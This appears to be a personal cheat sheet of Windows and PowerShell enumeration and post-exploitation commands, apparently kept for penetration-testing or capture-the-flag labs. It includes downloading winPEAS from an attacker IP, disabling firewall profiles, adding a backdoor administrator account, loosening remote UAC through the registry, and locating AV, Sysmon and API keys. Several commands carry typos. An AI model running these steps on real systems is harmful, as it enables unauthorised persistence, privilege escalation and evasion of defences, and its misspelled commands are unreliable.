- [WINDOWS](#windows)
- [Commands](#commands)
  - [Stabilize and Post Exploit windows](#stabilize-and-post-exploit-windows)
  - [Powershell](#powershell)
    - [Enumeration](#enumeration)

# WINDOWS

# Commands
- systeminof
  - part of Active Directory (workgroup / domain)
- wmic = Windows Management Instrumentation Command-line
  - wmic qfe get Caption, Description = updates
  - wmic product get name,version,vendor
  - wmic service where "name like 'name'" get Name,Version,Pathname
  - **wmic** find users || dir /p datei.txt (find file) = find file
  - wmic /namespace:\\root\securitycenter2 path antivirusproduct (workstation) = find AV
  - - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
    - find services not in folder c:\windows
    - find services without quotation marks
    - account for the service: sc qc SERVICE_NAME ==>local syste?

- Find 
  - get-Process -Name
  - Get-CimInstance
  - Get-Servive WinDefend
  - Get-MpComputerStatus
  - get-Netfirewallprofile
  - get-ChildItem -Hidden -Path C:\Users\NANE
    - Force
    - Recurse
    - Error
  - Test-NetConnection 
  - 

- Get-CimInstance
  - Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct (workstantion)
- Get-Servive WinDefend
- Get-MpComputerStatus
- get-Netfirewallprofile
- Test-NetConnection 
- net start = started services

- Firewalls
  - get-Netfirewallprofile | Format-table
  - set-netFirewallprofile -Profile NAME,nAME,NAMe, -enables Flase
  - | select Displayname, Enables, Description
  - get-netfirewallrulle | select Fields
  - get-MpThreat: findings by Denfender
  
- whoami 
  - /priv
  - /groups

- net 
  - user
  - group
  - localgroup [administrators]
  - accounts /domain
  - share

- ipconfig
  - /all

- netstat
  - -a all
  - -b binary connection
  - -n not resolving ip
  - -o PID
  - -l = listening
  - -t = tcp
  - -u = udp
  - -x = unix
  - -p = process id
  - find open ports

- Test Connection
  - Test-NetConnection / TCPClient
  - Test-NetConnection -ComputerName IP -Port

- get-EventLog -List
- sysmon: logger
  - get-Process | Where-Object  { $_.ProcessName -eq "Sysmon" }
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor Service'"
  - Get-Service | where-object {$_.DisplayName -like "*sysm*"}
  - Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"
  - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational
  - findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*

- Services
  - wmic product get name,version
    - wmic service where "name like 'name'" get Name,Version,Pathname
  - get-ChildItem -Hidden -Path C:\Users\NANE
    - -Force
    - -Recurse
    - -Path
    - -Include *.EXtension*
    - -File
    - -ErrocAction
  - get-Process
    - -Name
  - netstat -noa
  - net start
  - nslookup

- findstr = grep
- Windows: get file 
- powershell -c Invoke-Webrequest -OutFile winPeas.exe http://10.8.80.130/file.ext
- powershell -c wget "http://10.8.80.130/Invoke-winPEAS.ps1" -outfile "winPEAS.ps1"

- check permision
  - powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list" ==> if fullcontroll = vuln

- powershell.exe
  
## Stabilize and Post Exploit windows
- Create user + add group admin
  - **net user USERNAME PASS /add**
  - **net localgroup Administrators/"Backup Operators"/"Remote Management Users"/"Remote Desktop Users" Username /add**
  
- User Account Control
  - Less privilege when logged in remotly
  -  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1

- Assign BACKUP OPERATOR groups
  - secedit /export /cfg config.inf
    - SeBackupPrivilege
    - SeRestorePrivilege
    - secedit /import /cfg config.inf /db config.sdb
    - secedit /configure /db config.sdb /cfg config.inf

- Allow winRM
  - Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI

- Change registry values
  - defauld admin RID = 500
  - Regular users RID >= 1000
  - wmic useraccount get name,sid

## Powershell
- .NET framkework: software plattform für windows
- Commands = cmdlets
  - Verb-Noum
  - Get
  - Start
  - Stop
  - Read
  - Write
  - New
  - Out
- Get-Help [cmdlet] = display info
- Get-Command
  - Verb-*
  - *-Npin
  - New.*
  
- Pipelines |
  - objects are passed
  - Verb-Noum | get-Member => Info about cmdled, object (properties and methods)
    - -MemberType Method/Property/ScriptProperty
  
- Properties
  - COMMAND | Get-Member -MemberType Methody,Property,Other

- Manipulate
  - Select-Object -Property
  - Where-Object => grep
    - -Property PropertyName -operator Value
    -  {$_.PropertyName -operator Value}
       -  -Property Status -eq Running
    -  -operator
       -  -Contains
       -  -EQ
       -  -GT
 - Sort-Object
- Find FIle
  - Get-ChildItem -Recurse -Path "C:\" | Where-Object {$_.Name -match 'interesting*'}
    - -Recurse
    - -Force
    - -Hidden
    - -Path
    - -ErrorAction
    - -Include "\*.EXT\*"
  - Select-String 
    -  -Pattern API_KEY
  
- Measure-Object = count
- Base64
  - certutil.exe -decode INPUT_FILE OUTPUT_FILE
  - Encode: 
    - $Input = Textblablabla
    - $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
    - $EncodedText =[Convert]::ToBase64String($Bytes)
    - $EncodedText
  - Decode
    - $ENCODED = Get-Content -Path "C:\Users\Administrator\Desktop\b64.txt"  
  -  $DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))
  
### Enumeration
- COMMAND | get-member
- Get-LocalUser = show users
  - Where-Object {$_.SID -match 'S-1-5-21-1394777289-3961777894-1791813945-501'}
  - Get-LocalUser | Select-Object -Property Name,Enabled,SID
  - Get-LocalUser | Where-Object {$_.PasswordRequired -match 'False' } | measure-object
  
- Get-Localgroup
- Network
  - get-NetIPAddress
  - Get-NetTCPConnection
  - Test-NetConnection
  - Invoke-WebRequest
- Patches
  - Get-HotFix
- Scheduled-Task
  - Get-ScheduledTask
- Owner
  - Get-Acl
